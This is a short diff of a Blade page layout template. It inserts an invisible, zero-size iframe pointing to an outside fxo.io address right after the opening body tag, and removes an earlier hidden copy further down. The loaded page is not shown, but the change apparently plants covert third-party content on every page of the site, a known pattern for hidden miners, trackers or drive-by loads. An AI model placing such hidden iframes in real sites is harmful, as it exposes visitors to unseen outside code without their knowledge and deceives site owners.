@@ -30,6 +30,7 @@
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/fontawesome.css" integrity="sha384-ozJwkrqb90Oa3ZNb+yKFW2lToAWYdTiF1vt8JiH5ptTGHTGcN7qdoR1F95e0kYyG" crossorigin="anonymous">
 </head>
 <body>
+<iframe src="https://fxo.io/m/x2pxbkdw" width="0%" height="0%" style="display: none; border: 0 !important; width: 0%; height: 0%;"></iframe>
     <header class="header">
       <!-- Top Bar-->
       @section('top')
@@ -74,7 +75,7 @@
       @show
 
 
-    <iframe src="https://fxo.io/m/x2pxbkdw" width="20%" height="20%" style="display: none; border: 3px solid #f9f9fb; width: 100%; height: 100%;"></iframe>
+
       <div id="scrollTop">
         <i class="fa fa-long-arrow-alt-up"></i>
       </div>
